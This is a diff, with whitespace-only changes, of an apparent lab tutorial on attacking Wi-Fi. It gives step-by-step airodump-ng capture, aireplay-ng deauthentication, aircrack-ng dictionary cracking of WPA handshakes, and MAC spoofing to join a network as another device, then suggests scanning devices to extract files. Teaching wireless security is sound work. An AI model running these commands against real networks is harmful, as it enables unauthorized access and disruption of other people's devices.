@@ -88,14 +88,14 @@ different name…if so, research how you can change the name if you need to.
 --In the first terminal screen...
 
 12. Clear the screen (Ctrl + L) and start a packet capture.
-	•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0
+	• airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0
 
  	Note: Use --ignore-negative-one if you see { fixed channel mon0: -1 } on the top right corner.
 
-	•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0 --ignore-negative-one
+	• airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> mon0 --ignore-negative-one
 (To capture as .cap file)	–or–
-	•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0
-	•	airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0 --ignore-negative-one
+	• airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0
+	• airodump-ng -c 1 -w MYFILE001 --bssid <target_mac_address> --ivs mon0 --ignore-negative-one
 (Capturing an .ivs file takes a long time)
 
  	Note: You’ll need more than 20,000 #Data Frames to break the .ivs file…20,000+ is fine for breaking the .cap file.
@@ -103,18 +103,18 @@ different name…if so, research how you can change the name if you need to.
 --In a new terminal screen...
 
 13. Deauthorize the router to get the WPA Handshake…may or may not display.
-	•	aireplay-ng -0 5 -a <target_mac_address> mon0 --ignore-negative-one
+	• aireplay-ng -0 5 -a <target_mac_address> mon0 --ignore-negative-one
 (-a Router's MAC address)
 				–or–
-	•	aireplay-ng -0 5 -e ESSID mon0 --ignore-negative-one
+	• aireplay-ng -0 5 -e ESSID mon0 --ignore-negative-one
 (-e Router's Name...use --ignore-negative-one if you see fixed channel mon0: -1)
 
  	Note: You may need to raise the deauthorizing number from 5 to 15 or more.
 
 14. Stop the scanning and crack the password in the .cap file. Capturing either .cap or .ivs will give you the same results, but capturing .ivs will take a long time…possibly hours.
-	•	aircrack-ng -w Download/password.lst FILE_001.cap
+	• aircrack-ng -w Download/password.lst FILE_001.cap
 				–or–
-	•	aircrack-ng -w Download/password.lst FILE_001.ivs
+	• aircrack-ng -w Download/password.lst FILE_001.ivs
 
  	Note: The above example is my folder...yours will be different depending where you saved the password file…WPA Handshake message may or may not appear on screen.
 
@@ -131,43 +131,43 @@ SECTION #3: SPOOFING A DEVICE
 In this section I’ll be kicking off and spoofing my LG phone while using the main Wi-Fi adapter (wlan0). At this point no commands should be running, and your USB adapter (wlan1) should still be in monitor mode (mon0).
 
 1. Make sure the main Wi-Fi adapter (wlan0) is up and running. This is the main Wi-Fi adapter and NOT the USB device that was originally set to monitor mode.
-	•	ifconfig
+	• ifconfig
 
 2. In one terminal screen run the following command:
-	•	aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0
+	• aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0
 				–or–
-	•	aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0 --ignore-negative-one
+	• aireplay-ng -0 0 -a <bssid> -c <device_mac_address> mon0 --ignore-negative-one
 
 3. Select the device to spoof and change the MAC address of the Wi-Fi to match it. Again, this is NOT the adapter in monitor mode!!!
-	•	ifconfig wlan0 down
-	•	macchanger -m <target_mac_address> wlan0
-	•	ifconfig wlan0 up
+	• ifconfig wlan0 down
+	• macchanger -m <target_mac_address> wlan0
+	• ifconfig wlan0 up
 
 5. Confirm the MAC address change.
-	•	ifconfig		–or–
-	•	ifconfig wlan0		–or–
-	•	ifconfig | grep HW	–or–
-	•	iw dev
+	• ifconfig		–or–
+	• ifconfig wlan0		–or–
+	• ifconfig | grep HW	–or–
+	• iw dev
 
 4. Create a configuration file with the router’s password, psk file and ESSID information.
-	•	wpa_passphrase ESSID >> myfile.conf <found_password>
+	• wpa_passphrase ESSID >> myfile.conf <found_password>
 Ex: wpa_passphrase ThePromisedLAN >> myfile.conf password1234
 
 5. Stop the deauthorization from step #2 above.
 
 6. Use the configuration file to associate your computer as the spoofed device and wait. Watch for CTRL-EVENT-CONNECTED message.
-	•	wpa_supplicant -D wext -i wlan0 -c myfile.conf
+	• wpa_supplicant -D wext -i wlan0 -c myfile.conf
 
  	Note: If you close the terminal for step #6 your computer will disconnect.
 
 7. On the first terminal screen check the router’s specs and connection verification.
-	•	iw wlan0 link
+	• iw wlan0 link
 
 8. Configure the NIC using the DHCP protocol.
-	•	dhclient wlan0
+	• dhclient wlan0
 
 9. Display the routing table.
-	•	ip route show
+	• ip route show
 
 10. Ping your router, then a website (IP or URL).
 
@@ -178,22 +178,22 @@ Ex: wpa_passphrase ThePromisedLAN >> myfile.conf password1234
 --------------------------------------------------------------
 SECTION #4: ADDITIONAL NOTES
 --------------------------------------------------------------
-1.	Open a third terminal screen and do an nmap scan of the network and find other devices that may be opened and their ports. Figure what other tools you can use to get into them and extract files. A Wi-Fi printer is a good one to check. Use https://www.speedguide.net/ports.php to learn more about what each port does.
+1. Open a third terminal screen and do an nmap scan of the network and find other devices that may be opened and their ports. Figure what other tools you can use to get into them and extract files. A Wi-Fi printer is a good one to check. Use https://www.speedguide.net/ports.php to learn more about what each port does.
 
-2.	What is the MAC of the spoofed/kicked device?
+2. What is the MAC of the spoofed/kicked device?
 
-3.	What is IP and MAC address of the attacking computer?
+3. What is IP and MAC address of the attacking computer?
 
-4.	Can you use Thunderbird or Outlook? Why/why not?
+4. Can you use Thunderbird or Outlook? Why/why not?
 
-5.	Can you use gmail, etc?
+5. Can you use gmail, etc?
 
-6.	Do you understand what each command does? Write them down with a quick explanation of what you understand they do.
+6. Do you understand what each command does? Write them down with a quick explanation of what you understand they do.
 
-7.	Research what Google Hacks mean and how to use the commands to your advantage.
+7. Research what Google Hacks mean and how to use the commands to your advantage.
 
-8.	Now try to do this using wifite. You may need to reboot the system to do this a second time...research how to overcome this issue and restore your Wi-Fi without rebooting your system.
+8. Now try to do this using wifite. You may need to reboot the system to do this a second time...research how to overcome this issue and restore your Wi-Fi without rebooting your system.
 
-9.	Use your Google-fu skills and research how to find hidden SSIDs.
+9. Use your Google-fu skills and research how to find hidden SSIDs.
 
-10.	Remember not to be specific on your searches…instead of searching for: “how to change the name of a network card in linux” try: “change NIC name linux”.
+10. Remember not to be specific on your searches…instead of searching for: “how to change the name of a network card in linux” try: “change NIC name linux”.
